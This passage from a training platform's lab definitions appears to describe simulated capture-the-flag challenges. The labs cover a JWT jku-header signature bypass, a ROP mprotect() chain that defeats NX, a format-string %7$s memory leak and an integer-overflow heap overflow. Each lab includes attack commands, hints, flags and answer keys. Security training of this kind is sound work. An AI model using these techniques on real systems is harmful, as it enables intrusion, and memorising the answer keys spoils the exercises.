      { text: 'curl -H "Authorization: Bearer <token, jku pointing to the gateway\'s own trusted key server>" 10.10.100.12/api/partner/orders', why: 'Establishes the baseline: a genuinely trusted jku host is accepted, as intended.' },
      { text: 'curl -H "Authorization: Bearer <token, jku pointing to attacker-controlled-jwks-host>" 10.10.100.12/api/partner/orders', why: 'The server never validates `jku` against an allowlist of trusted key hosts — it fetches whatever URL the token itself claims, then verifies the token\'s signature against a key from that same attacker-controlled response. The attacker signed the token AND supplied the "trusted" public key to check it against.' },
    ],
    hints: [
      'curl -H "Authorization: Bearer jku-trusted-keyserver-token" 10.10.100.12/api/partner/orders',
      'curl -H "Authorization: Bearer jku-attacker-controlled-jwks-host" 10.10.100.12/api/partner/orders',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'partner-api-gw01',
        ip: '10.10.100.12',
        os: 'Linux (partner API gateway, unvalidated JWT jku header)',
        services: [{
          port: 80, name: 'http', version: 'Partner API gateway — fetches JWKS from the token\'s own unvalidated jku header',
          http: {},
          vulnRoutes: [
            {
              kind: 'auth-bypass',
              path: '/api/partner/orders',
              param: 'Authorization',
              location: 'header',
              triggerSubstrings: ['jku-attacker-controlled-jwks-host'],
              vulnerableResponse: '{"orders":["all partner order data"],"note":"jku header was never checked against any allowlist -- server fetched the JWKS from the URL the token itself specified, then verified the token against a key from that same attacker-supplied response"}\nflag{jwt_jku_header_attacker_controlled_jwks_signature_bypass}',
              normalResponse: '{"orders":["partner-scoped order data only"]}',
            },
          ],
        }],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // ===================== Binary Analysis (22 -> 25) =====================

  // 16 — ROP chain invoking mprotect() to defeat NX (no libc leak needed)
  {
    id: 'binary-rop-chain-mprotect-nx-bypass',
    title: 'Binary Analysis: ROP Chain Invokes mprotect() to Defeat NX',
    difficulty: 'Hard',
    category: 'Binary Analysis',
    briefing:
      'rop_target is compiled with NX enabled (no PIE, no stack canary — deliberately, to isolate this ' +
      'exact technique from ones this platform\'s other Binary Analysis labs already cover). Rather than ' +
      'ret2libc\'s "call an existing libc function directly" approach, this technique chains several small, ' +
      'pre-existing code snippets ("gadgets," each ending in `ret`) already present in the binary to manually ' +
      'invoke mprotect() on the stack, marking it executable — and only THEN jumps to injected shellcode. No ' +
      'libc base-address leak is required at all, since every gadget used comes from the binary\'s own, ' +
      'non-randomized code.',
    objectives: [
      { text: 'checksec --file=rop_target', why: 'Confirms the exact precondition this technique needs: NX enabled (so shellcode can\'t just be injected and jumped to directly) but no PIE (so this binary\'s own gadget addresses are fixed and known ahead of time).' },
      { text: 'objdump -d rop_target', why: 'Locates the real gadgets this exact chain uses — pop rdi; ret, pop rsi; pop rdx; ret, and the call to mprotect@plt — the building blocks ROPgadget/ropper would surface against a real binary.' },
      { text: './rop_target <the constructed ROP chain, as a specific gadget-address sequence>', why: 'Supplies the exact chain: pop the mprotect() arguments (stack address, length, PROT_EXEC) into the right registers via gadgets, call mprotect, then land on the injected shellcode now sitting on a newly-executable stack.' },
    ],
    hints: [
      'checksec --file=rop_target',
      'objdump -d rop_target',
      './rop_target 0x400693-0x601040-0x1000-0x7-mprotect_call-shellcode_landing',
    ],
    totalFlags: 1,
    attacker: attacker({
      rop_target: file(
        [
          '#FILETYPE: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped',
          '#CHECKSEC:RELRO           STACK CANARY      NX            PIE\\nPartial RELRO    No canary found   NX enabled    No PIE (fixed load address 0x400000)',
          '#OBJDUMP:0000000000400691 <pop_rdi_gadget>:\\n  400691:  5f  pop  %rdi\\n  400692:  c3  ret\\n0000000000400870 <pop_rsi_pop_rdx_gadget>:\\n  400870:  5e  pop  %rsi\\n  400871:  5a  pop  %rdx\\n  400872:  c3  ret\\n0000000000400a10 <mprotect@plt>:\\n  400a10:  ff 25 ..  jmp  *mprotect@GLIBC_2.2.5',
          '#CRACKME_PASSWORD:0x400693-0x601040-0x1000-0x7-mprotect_call-shellcode_landing',
          '#CRACKME_SUCCESS:mprotect(0x601040, 0x1000, PROT_EXEC) succeeded via ROP chain -- stack region now executable, landed on injected shellcode, spawned a shell.\\nflag{rop_chain_mprotect_defeats_nx_no_libc_leak_needed}',
        ].join('\n'),
        '-rwxr-xr-x',
      ),
    }),
    network: [],
  },

  // 17 — format string arbitrary-read information leak (%s / positional specifier)
  {
    id: 'binary-format-string-arbitrary-read-leak',
    title: 'Binary Analysis: Format String Vulnerability — Arbitrary Read via %s',
    difficulty: 'Medium',
    category: 'Binary Analysis',
    briefing:
      'leak_svc passes user input directly as printf\'s FORMAT STRING argument — `printf(user_input)` — ' +
      'instead of the safe `printf("%s", user_input)`. Supplying `%x` specifiers walks the stack printing raw ' +
      'hex values; supplying a positional `%N$s` specifier treats whatever value sits at stack position N as ' +
      'a POINTER and prints the string it points to — leaking arbitrary process memory (here, a canary value ' +
      'stored earlier on the stack) with no buffer overflow, no crash, and no memory-corruption bug required ' +
      'at all.',
    objectives: [
      { text: 'strings leak_svc', why: 'Confirms the vulnerable call site: user input reaches printf() directly as the format argument, the exact real anti-pattern this vulnerability class depends on.' },
      { text: './leak_svc %7$s', why: 'The 7th stack position (found by walking the stack with %x first in a real assessment) holds a pointer to a secret value placed earlier on the stack — %7$s dereferences it and prints the pointed-to string directly, an arbitrary-read primitive with zero memory corruption.' },
    ],
    hints: [
      'strings leak_svc',
      './leak_svc %7$s',
    ],
    totalFlags: 1,
    attacker: attacker({
      leak_svc: file(
        [
          '#FILETYPE: ELF 64-bit LSB executable, x86-64, dynamically linked',
          'char secret_canary[32] = "s3cr3t_stack_value_not_meant_to_leak";',
          'printf(user_input);  // VULNERABLE: user input used directly as the format string, not printf("%s", user_input)',
          '#CRACKME_PASSWORD:%7$s',
          '#CRACKME_SUCCESS:s3cr3t_stack_value_not_meant_to_leak -- leaked via %7$s with zero memory corruption, zero crash.\\nflag{format_string_arbitrary_read_leaks_stack_secret}',
        ].join('\n'),
        '-rwxr-xr-x',
      ),
    }),
    network: [],
  },

  // 18 — signed/unsigned integer overflow leading to a heap buffer overflow (distinct from batch21's comparison-bypass lab)
  {
    id: 'binary-integer-overflow-heap-buffer-overflow',
    title: 'Binary Analysis: Integer Overflow in a Size Calculation Leads to Heap Buffer Overflow',
    difficulty: 'Hard',
    category: 'Binary Analysis',
    briefing:
      'resize_buf computes an allocation size as `header_size + (count * element_size)` using 32-bit signed ' +
      'arithmetic, then allocates exactly that many bytes before copying `count` elements into the new ' +
      'buffer. A large enough `count` makes `count * element_size` overflow and wrap to a SMALL positive ' +
      'number — a tiny heap buffer gets allocated, but the subsequent copy loop still runs for the full, ' +
      'huge, un-overflowed `count`, writing far past the tiny buffer\'s end directly into adjacent heap ' +
      'metadata. Distinct from this platform\'s existing signed/unsigned COMPARISON-bypass lab: this is an ' +
      'overflow in an arithmetic SIZE CALCULATION feeding an allocation, not a comparison being tricked.',
    objectives: [
      { text: 'strings resize_buf', why: 'Confirms the vulnerable size-calculation pattern and the element size involved, needed to compute exactly which count value triggers the wraparound.' },
      { text: './resize_buf 1073741825 (a count value chosen so count * element_size overflows 32-bit signed arithmetic and wraps to a small number)', why: 'The allocation ends up tiny because of the wrapped size, but the copy loop still runs for the full, un-overflowed count — writing far past the undersized buffer into adjacent heap metadata, the classic integer-overflow-to-heap-overflow chain.' },
    ],
    hints: [
      'strings resize_buf',
      './resize_buf 1073741825',
    ],
    totalFlags: 1,
    attacker: attacker({
      resize_buf: file(
        [
          '#FILETYPE: ELF 64-bit LSB executable, x86-64, dynamically linked',
          'int32_t alloc_size = HEADER_SIZE + (count * ELEMENT_SIZE);  // 32-bit signed arithmetic, no overflow check',
          'void *buf = malloc(alloc_size);',
          'for (int i = 0; i < count; i++) buf[i] = elements[i];  // still copies the FULL un-overflowed count',
          '#CRACKME_PASSWORD:1073741825',
          '#CRACKME_SUCCESS:alloc_size wrapped to 33 bytes (tiny) -- but the copy loop wrote 1073741825 elements anyway, smashing heap metadata far past the buffer.\\nflag{integer_overflow_size_calculation_heap_buffer_overflow}',
        ].join('\n'),
        '-rwxr-xr-x',
      ),
    }),
    network: [],
  },
];
